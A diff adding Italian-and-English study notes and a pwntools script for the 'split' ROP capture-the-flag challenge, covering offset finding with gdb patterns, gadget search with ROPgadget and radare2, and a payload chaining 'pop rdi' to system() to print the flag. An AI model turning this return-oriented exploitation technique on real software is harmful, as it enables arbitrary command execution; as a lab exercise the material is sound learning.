@@ -1,5 +1,4 @@
-######## example file: 3_write4 ########   //simile a 1_split 
-
+######## example file: 3_write4 ########
 
 #instructions:
 
@@ -116,3 +115,64 @@ p.interactive()
 
 
 
+######## example file: 1_split ########
+
+#instructions:
+
+#gdb
+
+#per prendere offset
+#---------------------------------------  
+#pattern_create 300 pat300 //pat300 è il nome file
+#run < pat300  //se va bene da errore   
+
+#ricordati il tipo di invalid che ti sta dando    // invalid $PC adress
+
+#pattern_search
+#guarda nome errore e segnati offset  // es: EIP (è collegato a PC a quanto pare) e ha offset 140     
+#-----------------------------------------
+
+
+#radare2 ./nome_file
+#aaaa
+#afl
+#pdf @ useful_function
+#notiamo /bin/ls 
+
+# sappiamo che our ROP chain should have this structure: offset_padding + pop_rdi_gadget + print_flag_cmd + system_addr
+
+#ROPgadget --binary ./a.out | grep “rdi” 
+#Last, we need the gadget to put the address of the string into rdi:      0x0000000000400693 : pop rdi ; ret
+
+#radare2 ./nome_file
+#iz
+
+#ci segnamo l'indirizzo di /bin/cat/flag.txt
+
+#gdb
+#file nome_file
+#p system // segnati indirizzo
+
+#We have everything to build our chain:
+
+from pwn import *
+
+io = process('./split')
+
+
+# Gadget to pop rdi
+gadget = p64(0x4007c3)  #comando con grep 
+
+# Print flag
+print_flag = p64(0x601060) #comando iz 
+
+#system address
+system = p64(0x400560) #comando p system
+
+# Send the payload
+payload = b"A"*40 #fill the buffer until ret address  #40 è l'offset
+payload += gadget
+payload += print_flag
+payload += system
+io.sendline(payload)
+io.interactive()
